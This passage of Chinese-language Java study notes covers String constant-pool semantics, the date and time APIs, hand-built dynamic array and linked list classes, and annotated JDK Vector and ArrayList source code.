str1 = \"hello\";//1个，在常量池中 2、字符串的普通对象 123String str2 = new String();String str22 = new String(\"\");//两个对象，一个是常量池中的空字符串对象，一个是堆中的空字符串对象 3、字符串的普通对象和常量对象一起 12String str3 = new String(\"hello\");//str3首先指向堆中的一个字符串对象，然后堆中字符串的value数组指向常量池中常量对象的value数组 11.2.5 字符串拼接结果原则： （1）常量+常量：结果是常量池 （2）常量与变量 或 变量与变量：结果是堆 （3）拼接后调用intern方法：结果在常量池 123456789101112131415161718192021222324252627282930313233343536373839404142@Testpublic void test06()&#123; String s1 = \"hello\"; String s2 = \"world\"; String s3 = \"helloworld\"; String s4 = (s1 + \"world\").intern();//把拼接的结果放到常量池中 String s5 = (s1 + s2).intern(); System.out.println(s3 == s4);//true System.out.println(s3 == s5);//true&#125;@Testpublic void test05()&#123; final String s1 = \"hello\"; final String s2 = \"world\"; String s3 = \"helloworld\"; String s4 = s1 + \"world\";//s4字符串内容也helloworld，s1是常量，\"world\"常量，常量+ 常量 结果在常量池中 String s5 = s1 + s2;//s5字符串内容也helloworld，s1和s2都是常量，常量+ 常量 结果在常量池中 String s6 = \"hello\" + \"world\";//常量+ 常量 结果在常量池中，因为编译期间就可以确定结果 System.out.println(s3 == s4);//true System.out.println(s3 == s5);//true System.out.println(s3 == s6);//true&#125;@Testpublic void test04()&#123; String s1 = \"hello\"; String s2 = \"world\"; String s3 = \"helloworld\"; String s4 = s1 + \"world\";//s4字符串内容也helloworld，s1是变量，\"world\"常量，变量 + 常量的结果在堆中 String s5 = s1 + s2;//s5字符串内容也helloworld，s1和s2都是变量，变量 + 变量的结果在堆中 String s6 = \"hello\" + \"world\";//常量+ 常量 结果在常量池中，因为编译期间就可以确定结果 System.out.println(s3 == s4);//false System.out.println(s3 == s5);//false System.out.println(s3 == s6);//true&#125; 11.2.6 字符串的API（1）boolean isEmpty() （2）int length() （3）String concat(xx)：拼接，等价于+ （4）boolean contanis(xx) （5）int indexOf()：从前往后找，要是没有返回-1 （6）int lastIndexOf()：从后往前找，要是没有返回-1 （7）char charAt(index) （8）new String(char[] ) 或new String(char[] ,int, int) （9）char[] toCharArray() （10）byte[] getBytes()：编码，把字符串变为字节数组，按照平台默认的字符编码进行编码 ​ byte[] getBytes(字符编码方式)：按照指定的编码方式进行编码 （11）new String(byte[] ) 或 new String(byte[], int, int)：解码，按照平台默认的字符编码进行解码 ​ new String(byte[]，字符编码方式 ) 或 new String(byte[], int, int，字符编码方式)：解码，按照指定的编码方式进行解码 （12）String subString(int begin)：从[begin]开始到最后 String subString(int begin,int end)：从[begin, end) （13）boolean matchs(正则表达式) （14）String replace(xx,xx)：不支持正则 String replaceFirst(正则，value)：替换第一个匹配部分 String repalceAll(正则， value)：替换所有匹配部分 （15）String[] split(正则)：按照某种规则进行拆分 （16）boolean startsWith(xx)：是否以xx开头 boolean endsWith(xx)：是否以xx结尾 （17）String trim()：去掉前后空白符，字符串中间的空白符不会去掉 （18）String toUpperCase()：转大写 （19）String toLowerCase()：转小写 面试题：字符串的length和数组的length有什么不同？ 字符串的length()，数组的length属性 11.3 可变字符序列1、可变字符序列：StringBuilder和StringBuffer StringBuffer：老的，线程安全的（因为它的方法有synchronized修饰） StringBuilder：线程不安全的 2、面试题：String和StringBuilder、StringBuffer的区别？ String：不可变对象，不可变字符序列 StringBuilder、StringBuffer： 可变字符序列 3、常用的API，StringBuilder、StringBuffer的API是完全一致的 （1）append(xx)：拼接，追加 （2）insert(int index, xx)：插入 （3）delete(int start, int end) deleteCharAt(int index) （4）set(int index, xx) （5）reverse()：反转 …. 替换、截取、查找… 11.4 和数学相关的1、java.lang.Math类 （1）sqrt()：求平方根 （2）pow(x,y)：求x的y次方 （3）random()：返回[0,1)范围的小数 （4）max(x,y)：找x,y最大值 ​ min(x,y)：找最小值 （5）round(x)：四舍五入 ​ ceil(x)：进一 ​ floor(x)：退一 ….. 2、java.math包 BigInteger：大整数 BigDecimal：大小数 运算通过方法完成：add(),subtract(),multiply(),divide()…. 11.5 日期时间API11.5.1 JDK1.8之前1、java.util.Date new Date()：当前系统时间 long getTime()：返回该日期时间对象距离1970-1-1 0.0.0 0毫秒之间的毫秒值 new Date(long 毫秒)：把该毫秒值换算成日期时间对象 2、java.util.Calendar： （1）getInstance()：得到Calendar的镀锡 （2）get(常量) 3、java.text.SimpleDateFormat：日期时间的格式化 y：表示年 M：月 d：天 H： 小时，24小时制 h：小时，12小时制 m：分 s：秒 S：毫秒 E：星期 D：年当中的天数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081@Testpublic void test10() throws ParseException&#123; String str = \"2019年06月06日 16时03分14秒 545毫秒 星期四 +0800\"; SimpleDateFormat sf = new SimpleDateFormat(\"yyyy年MM月dd日 HH时mm分ss秒 SSS毫秒 E Z\"); Date d = sf.parse(str); System.out.println(d);&#125;@Testpublic void test9()&#123; Date d = new Date(); SimpleDateFormat sf = new SimpleDateFormat(\"yyyy年MM月dd日 HH时mm分ss秒 SSS毫秒 E Z\"); //把Date日期转成字符串，按照指定的格式转 String str = sf.format(d); System.out.println(str);&#125;@Testpublic void test8()&#123; String[] all = TimeZone.getAvailableIDs(); for (int i = 0; i &lt; all.length; i++) &#123; System.out.println(all[i]); &#125;&#125;@Testpublic void test7()&#123; TimeZone t = TimeZone.getTimeZone(\"America/Los_Angeles\"); //getInstance(TimeZone zone) Calendar c = Calendar.getInstance(t); System.out.println(c);&#125;@Testpublic void test6()&#123; Calendar c = Calendar.getInstance(); System.out.println(c); int year = c.get(Calendar.YEAR); System.out.println(year); int month = c.get(Calendar.MONTH)+1; System.out.println(month); //...&#125;@Testpublic void test5()&#123; long time = Long.MAX_VALUE; Date d = new Date(time); System.out.println(d);&#125;@Testpublic void test4()&#123; long time = 1559807047979L; Date d = new Date(time); System.out.println(d);&#125;@Testpublic void test3()&#123; Date d = new Date(); long time = d.getTime(); System.out.println(time);//1559807047979&#125;@Testpublic void test2()&#123; long time = System.currentTimeMillis(); System.out.println(time);//1559806982971 //当前系统时间距离1970-1-1 0:0:0 0毫秒的时间差，毫秒为单位&#125;@Testpublic void test1()&#123; Date d = new Date(); System.out.println(d);&#125; 11.5.2 JDK1.8之后java.time及其子包中。 1、LocalDate、LocalTime、LocalDateTime （1）now()：获取系统日期或时间 （2）of(xxx)：或者指定的日期或时间 （3）运算：运算后得到新对象，需要重新接受 plusXxx()：在当前日期或时间对象上加xx minusXxx() ：在当前日期或时间对象上减xx 方法 描述 now() / now(ZoneId zone) 静态方法，根据当前时间创建对象/指定时区的对象 of() 静态方法，根据指定日期/时间创建对象 getDayOfMonth()/getDayOfYear() 获得月份天数(1-31) /获得年份天数(1-366) getDayOfWeek() 获得星期几(返回一个 DayOfWeek 枚举值) getMonth() 获得月份, 返回一个 Month 枚举值 getMonthValue() / getYear() 获得月份(1-12) /获得年份 getHours()/getMinute()/getSecond() 获得当前对象对应的小时、分钟、秒 withDayOfMonth()/withDayOfYear()/withMonth()/withYear() 将月份天数、年份天数、月份、年份修改为指定的值并返回新的对象 with(TemporalAdjuster t) 将当前日期时间设置为校对器指定的日期时间 plusDays(), plusWeeks(), plusMonths(), plusYears(),plusHours() 向当前对象添加几天、几周、几个月、几年、几小时 minusMonths() / minusWeeks()/minusDays()/minusYears()/minusHours() 从当前对象减去几月、几周、几天、几年、几小时 plus(TemporalAmount t)/minus(TemporalAmount t) 添加或减少一个 Duration 或 Period isBefore()/isAfter() 比较两个 LocalDate isLeapYear() 判断是否是闰年（在LocalDate类中声明） format(DateTimeFormatter t) 格式化本地日期、时间，返回一个字符串 parse(Charsequence text) 将指定格式的字符串解析为日期、时间 2、DateTimeFormatter：日期时间格式化 该类提供了三种格式化方法： 预定义的标准格式。如：ISO_DATE_TIME;ISO_DATE 本地化相关的格式。如：ofLocalizedDate(FormatStyle.MEDIUM) 自定义的格式。如：ofPattern(“yyyy-MM-dd hh:mm:ss”) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071 @Test public void test10()&#123; LocalDateTime now = LocalDateTime.now(); // DateTimeFormatter df = DateTimeFormatter.ofLocalizedDateTime(FormatStyle.LONG);//2019年6月6日 下午04时40分03秒 DateTimeFormatter df = DateTimeFormatter.ofLocalizedDateTime(FormatStyle.SHORT);//19-6-6 下午4:40 String str = df.format(now); System.out.println(str); &#125; @Test public void test9()&#123; LocalDateTime now = LocalDateTime.now(); DateTimeFormatter df = DateTimeFormatter.ISO_DATE_TIME;//2019-06-06T16:38:23.756 String str = df.format(now); System.out.println(str); &#125; @Test public void test8()&#123; LocalDateTime now = LocalDateTime.now(); DateTimeFormatter df = DateTimeFormatter.ofPattern(\"yyyy年MM月dd日 HH时mm分ss秒 SSS毫秒 E 是这一年的D天\"); String str = df.format(now); System.out.println(str); &#125; @Test public void test7()&#123; LocalDate now = LocalDate.now(); LocalDate before = now.minusDays(100); System.out.println(before);//2019-02-26 &#125; @Test public void test06()&#123; LocalDate lai = LocalDate.of(2019, 5, 13); LocalDate go = lai.plusDays(160); System.out.println(go);//2019-10-20 &#125; @Test public void test05()&#123; LocalDate lai = LocalDate.of(2019, 5, 13); System.out.println(lai.getDayOfYear()); &#125; @Test public void test04()&#123; LocalDate lai = LocalDate.of(2019, 5, 13); System.out.println(lai); &#125; @Test public void test03()&#123; LocalDateTime now = LocalDateTime.now(); System.out.println(now); &#125; @Test public void test02()&#123; LocalTime now = LocalTime.now(); System.out.println(now); &#125; @Test public void test01()&#123; LocalDate now = LocalDate.now(); System.out.println(now); &#125; 第十二章 集合12.1 概念数据结构：存储数据的某种结构 （1）底层的物理结构 ①数组：开辟连续的存储空间，每一个元素使用[下标]进行区别 ②链式：不需要开辟连续的存储空间，但是需要“结点”来包装要存储的数据，结点包含两部分内容： ​ A、数据 ​ B、记录其他结点的地址，例如：next，pre，left，right，parent等 （2）表现出来的逻辑结构：动态数组、单向链表、双向链表、队列、栈、二叉树、哈希表、图等 12.2 手动实现一些逻辑结构1、动态数组 包含： （1）内部使用一个数组，用来存储数据 （2）内部使用一个total，记录实际存储的元素的个数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173public class MyArrayList &#123; //为什么使用Object，因为只是说这个容器是用来装对象的，但是不知道用来装什么对象。 private Object[] data; private int total; public MyArrayList()&#123; data = new Object[5]; &#125; //添加一个元素 public void add(Object obj)&#123; //检查是否需要扩容 checkCapacity(); data[total++] = obj; &#125; private void checkCapacity() &#123; //如果data满了，就扩容为原来的2倍 if(total &gt;= data.length)&#123; data = Arrays.copyOf(data, data.length*2); &#125; &#125; //返回实际元素的个数 public int size()&#123; return total; &#125; //返回数组的实际容量 public int capacity()&#123; return data.length; &#125; //获取[index]位置的元素 public Object get(int index)&#123; //校验index的合理性范围 checkIndex(index); return data[index]; &#125; private void checkIndex(int index) &#123; if(index&lt;0 || index&gt;=total)&#123; throw new RuntimeException(index+\"对应位置的元素不存在\");// throw new IndexOutOfBoundsException(index+\"越界\"); &#125; &#125; //替换[index]位置的元素 public void set(int index, Object value)&#123; //校验index的合理性范围 checkIndex(index); data[index] = value; &#125; //在[index]位置插入一个元素value public void insert(int index, Object value)&#123; /* * (1)考虑下标的合理性 * (2)总长度是否够 * (3)[index]以及后面的元素往后移动，把[index]位置腾出来 * (4)data[index]=value 放入新元素 * (5)total++ 有效元素的个数增加 */ //(1)考虑下标的合理性：校验index的合理性范围 checkIndex(index); //(2)总长度是否够：检查是否需要扩容 checkCapacity(); //(3)[index]以及后面的元素往后移动，把[index]位置腾出来 /* * 假设total = 5, data.length= 10, index= 1 * 有效元素的下标[0,4] * 移动：[1]-&gt;[2],[2]-&gt;[3],[3]-&gt;[4],[4]-&gt;[5] * 移动元素的个数：total-index */ System.arraycopy(data, index, data, index+1, total-index); //(4)data[index]=value 放入新元素 data[index] = value; //(5)total++ 有效元素的个数增加 total++; &#125; //返回所有实际存储的元素 public Object[] getAll()&#123; //返回total个 return Arrays.copyOf(data, total); &#125; //删除[index]位置的元素 public void remove(int index)&#123; /* * (1)校验index的合理性范围 * (2)移动元素，把[index+1]以及后面的元素往前移动 * (3)把data[total-1]=null 让垃圾回收器尽快回收 * (4)总元素个数减少 total-- */ //(1)考虑下标的合理性：校验index的合理性范围 checkIndex(index); //(2)移动元素，把[index+1]以及后面的元素往前移动 /* * 假设total=8, data.length=10, index = 3 * 有效元素的范围[0,7] * 移动：[4]-&gt;[3],[5]-&gt;[4],[6]-&gt;[5],[7]-&gt;[6] * 移动了4个：total-index-1 */ System.arraycopy(data, index+1, data, index, total-index-1); //(3)把data[total-1]=null 让垃圾回收器尽快回收 data[total-1] = null; // (4)总元素个数减少 total-- total--; &#125; //查询某个元素的下标 public int indexOf(Object obj)&#123; if(obj == null)&#123; for (int i = 0; i &lt; total; i++) &#123; if(data[i] == null)&#123;//等价于 if(data[i] == obj) return i; &#125; &#125; &#125;else&#123; for (int i = 0; i &lt; data.length; i++) &#123; if(obj.equals(data[i]))&#123; return i; &#125; &#125; &#125; return -1; &#125; //删除数组中的某个元素 //如果有重复的，只删除第一个 public void remove(Object obj)&#123; /* * (1)先查询obj的[index] * (2)如果存在，就调用remove(index)删除就可以 */ //(1)先查询obj的[index] int index = indexOf(obj); if(index != -1)&#123; remove(index); &#125; //不存在，可以什么也不做 //不存在，也可以抛异常 //throw new RuntimeException(obj + \"不存在\"); &#125; public void set(Object old, Object value)&#123; /* * (1)查询old的[index] * (2)如果存在，就调用set(index, value) */ // (1)查询old的[index] int index = indexOf(old); if(index!=-1)&#123; set(index, value); &#125; //不存在，可以什么也不做 &#125;&#125; 2、单向链表 包含： （1）包含一个Node类型的成员变量first：用来记录第一个结点的地址 如果这个链表是空的，还没有任何结点，那么first是null。 最后一个结点的特征：就是它的next是null （2）内部使用一个total，记录实际存储的元素的个数 （3）使用了一个内部类Node 1234private class Node&#123; Object data; Node next;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163public class SingleLinkedList &#123; //这里不需要数组，不需要其他的复杂的结构，我只要记录单向链表的“头”结点 private Node first;//first中记录的是第一个结点的地址 private int total;//这里我记录total是为了后面处理的方便，例如：当用户获取链表有效元素的个数时，不用现数，而是直接返回total等 /* * 内部类，因为这种Node结点的类型，在别的地方没有用，只在单向链表中，用于存储和表示它的结点关系。 * 因为我这里涉及为内部类型。 */ private class Node&#123; Object data;//因为数据可以是任意类型的对象，所以设计为Object Node next;//因为next中记录的下一个结点的地址，因此类型是结点类型 //这里data,next没有私有化，是希望在外部类中可以不需要get/set，而是直接“结点对象.data\",\"结点对象.next\"使用 Node(Object data, Node next)&#123; this.data = data; this.next = next; &#125; &#125; public void add(Object obj)&#123; /* * (1)把obj的数据，包装成一个Node类型结点对象 * (2)把新结点“链接”当前链表的最后 * ①当前新结点是第一个结点 * 如何判断是否是第一个 if(first==null)说明暂时还没有第一个 * ②先找到目前的最后一个，把新结点链接到它的next中 * 如何判断是否是最后一个 if(某个结点.next == null)说明这个结点是最后一个 */// (1)把obj的数据，包装成一个Node类型结点对象 //这里新结点的next赋值为null，表示新结点是最后一个结点 Node newNode = new Node(obj, null); //①当前新结点是第一个结点 if(first == null)&#123; //说明newNode是第一个 first = newNode; &#125;else&#123; //②先找到目前的最后一个，把新结点链接到它的next中 Node node = first; while(node.next != null)&#123; node = node.next; &#125; //退出循环时node指向最后一个结点 //把新结点链接到它的next中 node.next = newNode; &#125; total++; &#125; public int size()&#123; return total; &#125; public Object[] getAll()&#123; //(1)创建一个数组，长度为total Object[] all = new Object[total]; //(2)把单向链表的每一个结点中的data，拿过来放到all数组中 Node node = first; for (int i = 0; i &lt; total; i++) &#123;// all[i] = 结点.data; all[i] = node.data; //然后node指向下一个 node = node.next; &#125; //(3)返回数组 return all; &#125; public void remove(Object obj)&#123; if(obj == null)&#123; //(1)先考虑是否是第一个 if(first!=null)&#123;//链表非空 //要删除的结点正好是第一个结点 if(first.data == null)&#123; //让第一个结点指向它的下一个 first = first.next; total--; return; &#125; //要删除的不是第一个结点 Node node = first.next;//第二个结点 Node last = first; while(node.next!=null)&#123;//这里不包括最后一个，因为node.next==null，不进入循环，而node.next==null是最后一个 if(node.data == null)&#123; last.next = node.next; total--; return; &#125; last = node; node = node.next; &#125; //单独判断最后一个是否是要删除的结点 if(node.data == null)&#123; //要删除的是最后一个结点 last.next = null; total--; return; &#125; &#125; &#125;else&#123; //(1)先考虑是否是第一个 if(first!=null)&#123;//链表非空 //要删除的结点正好是第一个结点 if(obj.equals(first.data))&#123; //让第一个结点指向它的下一个 first = first.next; total--; return; &#125; //要删除的不是第一个结点 Node node = first.next;//第二个结点 Node last = first; while(node.next!=null)&#123;//这里不包括最后一个，因为node.next==null，不进入循环，而node.next==null是最后一个 if(obj.equals(node.data))&#123; last.next = node.next; total--; return; &#125; last = node; node = node.next; &#125; //单独判断最后一个是否是要删除的结点 if(obj.equals(node.data))&#123; //要删除的是最后一个结点 last.next = null; total--; return; &#125; &#125; &#125; &#125; public int indexOf(Object obj)&#123; if(obj == null)&#123; Node node = first; for (int i = 0; i &lt; total; i++) &#123; if(node.data == null)&#123; return i; &#125; node = node.next; &#125; &#125;else&#123; Node node = first; for (int i = 0; i &lt; total; i++) &#123; if(obj.equals(node.data))&#123; return i; &#125; node = node.next; &#125; &#125; return -1; &#125;&#125; 12.3 Collection因为集合的类型很多，那么我们把它们称为集合框架。 集合框架分为两个家族：Collection（一组对象）和Map（一组映射关系、一组键值对） 12.3.1 CollectionCollection是代表一种对象的集合。它是Collection系列的根接口。 它们虽然：有些可能是有序的，有些可能是无序的，有些可能可以重复的，有些不能重复的，但是它们有共同的操作规范，因此这些操作的规范就抽象为了Collection接口。 常用方法： （1）boolean add(Object obj)：添加一个 （2）boolean addAll（Collection c）：添加多个 （3）boolean remove(Object obj)：删除一个 （4）boolean removeAll(Collection c )： 删除多个 （5）boolean contains(Object c)：是否包含某个 （6）boolean containsAll(Collection c)： 是否包含所有 （7）boolean isEmpty()：是否为空 （8）int size()：获取元素个数 （9）void clear()：清空集合 （10）Object[] toArray()：获取所有元素 （11）Iterator iterator()： 获取遍历当前集合的迭代器对象 （12）retainAll(Collection c)：求当前集合与c集合的交集 12.3.2 Collection系列的集合的遍历1、明确使用Iterator迭代器 1234567Collection c = ....;Iterator iter = c.iterator();while(iter.hashNext())&#123; Object obj = iter.next(); //...&#125; Iterator 接口的方法： （1）boolean hasNext() （2）Object next() （3）void remove() 2、foreach 12345Collection c = ....;for(Object obj : c)&#123; //...&#125; 什么样的集合（容器）能够使用foreach遍历？ （1）数组： （2）实现了java.lang.Iterable接口 这个接口有一个抽象方法：Iterator iterator() Iterator也是一个接口，它的实现类，通常在集合（容器）类中用内部类实现。并在iterator()的方法中创建它的对象。 1234567891011121314151617181920212223242526public class MyArrayList implements Iterable&#123; //为什么使用Object，因为只是说这个容器是用来装对象的，但是不知道用来装什么对象。 private Object[] data; private int total; //其他代码省略.... @Override public Iterator iterator() &#123; return new MyItr(); &#125; private class MyItr implements Iterator&#123; private int cursor;//游标 @Override public boolean hasNext() &#123; return cursor!=total; &#125; @Override public Object next() &#123; return data[cursor++]; &#125; &#125;&#125; 思考：如果遍历数组，什么情况下选用foreach，什么情况下选用for循环？ 当如果你的操作中涉及到[下标]操作时，用for最好。 当你只是查看元素的内容，那么选foreach更简洁一些。 思考：如果遍历Collection系列集合，什么情况下选用foreach，是否能选用for循环？ 首先考虑使用foreach，如果该集合也有索引信息的话，也可以通过for来操作，如果没有下标的信息，就不要用for。即，如果该集合的物理结构是数组的，那么可以用for，如果物理结构是链式，那么使用下标操作效率很低。 思考：如果遍历Collection系列集合，什么情况下选用foreach，什么情况下使用Iterator？ 如果只是查看集合的元素，使用foreach，代码会更简洁。 但是如果要涉及到在遍历集合的同时根据某种条件要删除元素等操作，那么选用Iterator。 12.4 List12.4.1 List概述List：是Collection的子接口。 List系列的集合：有序的、可重复的 List系列的常用集合：ArrayList、Vector、LinkedList、Stack 12.4.2 List的API常用方法： （1）boolean add(Object obj)：添加一个 （2）boolean addAll（Collection c）：添加多个 （3）void add(int index, Object obj)：添加一个，指定位置添加 （4）void addAll(int index, Collection c）：添加多个 （5）boolean remove(Object obj)：删除一个 （6）Object remove(int index)：删除指定位置的元素，并返回刚刚删除的元素 （7）boolean removeAll(Collection c )： 删除多个 （8）boolean contains(Object c)：是否包含某个 （9）boolean containsAll(Collection c)： 是否包含所有 （10）boolean isEmpty()：是否为空 （11）int size()：获取元素个数 （12）void clear()：清空集合 （13）Object[] toArray()：获取所有元素 （14）Iterator iterator()： 获取遍历当前集合的迭代器对象 （15）retainAll(Collection c)：求当前集合与c集合的交集 （16）ListIterator listIterator()：获取遍历当前集合的迭代器对象，这个迭代器可以往前、往后遍历 （17）ListIterator listIterator(int index)：从[index]位置开始，往前或往后遍历 （18）Object get(int index)：返回index位置的元素 （19）List subList(int start, int end)：截取[start,end)部分的子列表 12.4.3 ListIterator 接口Iterator 接口的方法： （1）boolean hasNext() （2）Object next() （3）void remove() ListIterator 是 Iterator子接口：增加了如下方法 （4）void add(Object obj) （5）void set(Object obj) （6）boolean hasPrevious() （7）Object previous() （8）int nextIndex() （9）int previousIndex() 12.4.4 List的实现类们的区别ArrayList、Vector、LinkedList、Stack （1）ArrayList、Vector：都是动态数组 Vector是最早版本的动态数组，线程安全的，默认扩容机制是2倍，支持旧版的迭代器Enumeration ArrayList是后增的动态数组，线程不安全的，默认扩容机制是1.5倍 （2）动态数组与LinkedList的区别 动态数组：底层物理结构是数组 ​ 优点：根据[下标]访问的速度很快 ​ 缺点：需要开辟连续的存储空间，而且需要扩容，移动元素等操作 LinkedList：底层物理结构是双向链表 ​ 优点：在增加、删除元素时，不需要移动元素，只需要修改前后元素的引用关系 ​ 缺点：我们查找元素时，只能从first或last开始查找 （3）Stack：栈 是Vector的子类。比Vector多了几个方法，能够表现出“先进后出或后进先出”的特点。 ①Object peek()：访问栈顶元素 ②Object pop()：弹出栈顶元素 ③push()：把元素压入栈顶 （4）LinkedList可以作为很多种数据结构使用 单链表：只关注next就可以 队列：先进先出，找对应的方法 双端队列(JDK1.6加入)：两头都可以进出，找对应的方法 栈：先进后出，找对应的方法 建议：虽然LinkedList是支持对索引进行操作，因为它实现List接口的所有方法，但是我们不太建议调用类似这样的方法，因为效率比较低。 12.4.5 源码分析（1）Vector1234567891011121314151617 public Vector() &#123; this(10);//指定初始容量initialCapacity为10 &#125;public Vector(int initialCapacity) &#123; this(initialCapacity, 0);//指定capacityIncrement增量为0 &#125; public Vector(int initialCapacity, int capacityIncrement增量为0) &#123; super(); //判断了形参初始容量initialCapacity的合法性 if (initialCapacity &lt; 0) throw new IllegalArgumentException(\"Illegal Capacity: \"+ initialCapacity); //创建了一个Object[]类型的数组 this.elementData = new Object[initialCapacity];//默认是10 //增量，默认是0，如果是0，后面就按照2倍增加，如果不是0，后面就按照你指定的增量进行增量 this.capacityIncrement = capacityIncrement; &#125; 1234567891011121314151617181920212223242526272829303132333435//synchronized意味着线程安全的 public synchronized boolean add(E e) &#123; modCount++; //看是否需要扩容 ensureCapacityHelper(elementCount + 1); //把新的元素存入[elementCount]，存入后，elementCount元素的个数增1 elementData[elementCount++] = e; return true; &#125; private void ensureCapacityHelper(int minCapacity) &#123; // overflow-conscious code //看是否超过了当前数组的容量 if (minCapacity - elementData.length &gt; 0) grow(minCapacity);//扩容 &#125; private void grow(int minCapacity) &#123; // overflow-conscious code int oldCapacity = elementData.length;//获取目前数组的长度 //如果capacityIncrement增量是0，新容量 = oldCapacity的2倍 //如果capacityIncrement增量是不是0，新容量 = oldCapacity + capacityIncrement增量; int newCapacity = oldCapacity + ((capacityIncrement &gt; 0) ? capacityIncrement : oldCapacity); //如果按照上面计算的新容量还不够，就按照你指定的需要的最小容量来扩容minCapacity if (newCapacity - minCapacity &lt; 0) newCapacity = minCapacity; //如果新容量超过了最大数组限制，那么单独处理 if (newCapacity - MAX_ARRAY_SIZE &gt; 0) newCapacity = hugeCapacity(minCapacity); //把旧数组中的数据复制到新数组中，新数组的长度为newCapacity elementData = Arrays.copyOf(elementData, newCapacity); &#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354public boolean remove(Object o) &#123; return removeElement(o);&#125;public synchronized boolean removeElement(Object obj) &#123; modCount++; //查找obj在当前Vector中的下标 int i = indexOf(obj); //如果i&gt;=0，说明存在，删除[i]位置的元素 if (i &gt;= 0) &#123; removeElementAt(i); return true; &#125; return false;&#125;public int indexOf(Object o) &#123; return indexOf(o, 0);&#125;public synchronized int indexOf(Object o, int index) &#123; if (o == null) &#123;//要查找的元素是null值 for (int i = index ; i &lt; elementCount ; i++) if (elementData[i]==null)//如果是null值，用==null判断 return i; &#125; else &#123;//要查找的元素是非null值 for (int i = index ; i &lt; elementCount ; i++) if (o.equals(elementData[i]))//如果是非null值，用equals判断 return i; &#125; return -1;&#125;public synchronized void removeElementAt(int index) &#123; modCount++; //判断下标的合法性 if (index &gt;= elementCount) &#123; throw new ArrayIndexOutOfBoundsException(index + \" &gt;= \" + elementCount); &#125; else if (index &lt; 0) &#123; throw new ArrayIndexOutOfBoundsException(index); &#125; //j是要移动的元素的个数 int j = elementCount - index - 1; //如果需要移动元素，就调用System.arraycopy进行移动 if (j &gt; 0) &#123; //把index+1位置以及后面的元素往前移动 //index+1的位置的元素移动到index位置，依次类推 //一共移动j个 System.arraycopy(elementData, index + 1, elementData, index, j); &#125; //元素的总个数减少 elementCount--; //将elementData[elementCount]这个位置置空，用来添加新元素，位置的元素等着被GC回收 elementData[elementCount] = null; /* to let gc do its work */&#125; （2）ArrayList源码分析JDK1.6： 123456789101112 public ArrayList() &#123;this(10);//指定初始容量为10 &#125; public ArrayList(int initialCapacity) &#123;super(); //检查初始容量的合法性 if (initialCapacity &lt; 0) throw new IllegalArgumentException(\"Illegal Capacity: \"+ initialCapacity); //数组初始化为长度为initialCapacity的数组this.elementData = new Object[initialCapacity]; &#125; JDK1.7 123456789101112131415161718192021 private static final int DEFAULT_CAPACITY = 10;//默认初始容量10private static final Object[] EMPTY_ELEMENTDATA = &#123;&#125;;public ArrayList() &#123; super(); this.elementData = EMPTY_ELEMENTDATA;//数组初始化为一个空数组 &#125; public boolean add(E e) &#123; //查看当前数组是否够多存一个元素 ensureCapacityInternal(size + 1); // Increments modCount!! elementData[size++] = e; return true; &#125; private void ensureCapacityInternal(int minCapacity) &#123; if (elementData == EMPTY_ELEMENTDATA) &#123;//如果当前数组还是空数组 //minCapacity按照 默认初始容量和minCapacity中的的最大值处理 minCapacity = Math.max(DEFAULT_CAPACITY, minCapacity); &#125; //看是否需要扩容处理 ensureExplicitCapacity(minCapacity); &#125;//... JDK1.8 123456789101112131415161718192021222324252627282930313233343536373839404142434445private static final int DEFAULT_CAPACITY = 10;private static final Object[] EMPTY_ELEMENTDATA = &#123;&#125;;private static final Object[] DEFAULTCAPACITY_EMPTY_ELEMENTDATA = &#123;&#125;; public ArrayList() &#123; this.elementData = DEFAULTCAPACITY_EMPTY_ELEMENTDATA;//初始化为空数组 &#125; public boolean add(E e) &#123; //查看当前数组是否够多存一个元素 ensureCapacityInternal(size + 1); // Increments modCount!! //存入新元素到[size]位置，然后size自增1 elementData[size++] = e; return true; &#125; private void ensureCapacityInternal(int minCapacity) &#123; //如果当前数组还是空数组 if (elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA) &#123; //那么minCapacity取DEFAULT_CAPACITY与minCapacity的最大值 minCapacity = Math.max(DEFAULT_CAPACITY, minCapacity); &#125; //查看是否需要扩容 ensureExplicitCapacity(minCapacity); &#125; private void ensureExplicitCapacity(int minCapacity) &#123; modCount++;//修改次数加1 // 如果需要的最小容量 比 当前数组的长度 大，即当前数组不够存，就扩容 if (minCapacity - elementData.length &gt; 0) grow(minCapacity); &#125; private void grow(int minCapacity) &#123; // overflow-conscious code int oldCapacity = elementData.length;//当前数组容量 int newCapacity = oldCapacity + (oldCapacity &gt;&gt; 1);//新数组容量是旧数组容量的1.5倍 //看旧数组的1.5倍是否够 if (newCapacity - minCapacity &lt; 0) newCapacity = minCapacity; //看旧数组的1.5倍是否超过最大数组限制 if (newCapacity - MAX_ARRAY_SIZE &gt; 0) newCapacity = hugeCapacity(minCapacity); //复制一个新数组 elementData = Arrays.copyOf(elementData, newCapacity); &#125; 12345678910111213141516171819202122232425262728293031public boolean remove(Object o) &#123; //先找到o在当前ArrayList的数组中的下标 //分o是否为空两种情况讨论 if (o == null) &#123; for (int index = 0; index &lt; size; index++) if (elementData[index] == null) &#123;//null值用==比较 fastRemove(index); return true; &#125; &#125; else &#123; for (int index = 0; index &lt; size; index++) if (o.equals(elementData[index])) &#123;//非null值用equals比较 fastRemove(index); return true; &#125; &#125; return false;&#125;private void fastRemove(int index) &#123; modCount++;//修改次数加1 //需要移动的元素个数 int numMoved = size - index - 1; //如果需要移动元素，就用System.arraycopy移动元素 if (numMoved &gt; 0) System.arraycopy(elementData, index+1, elementData, index, numMoved); //将elementData[size-1]位置置空，让GC回收空间，元素个数减少 elementData[--size] = null; // clear to let GC do its work&#125; 1234567891011121314151617181920 public E remove(int index) &#123; rangeCheck(index);//检验index是否合法 modCount++;//修改次数加1 //取出[index]位置的元素，[index]位置的元素就是要被删除的元素，用于最后返回被删除的元素 E oldValue = elementData(index); 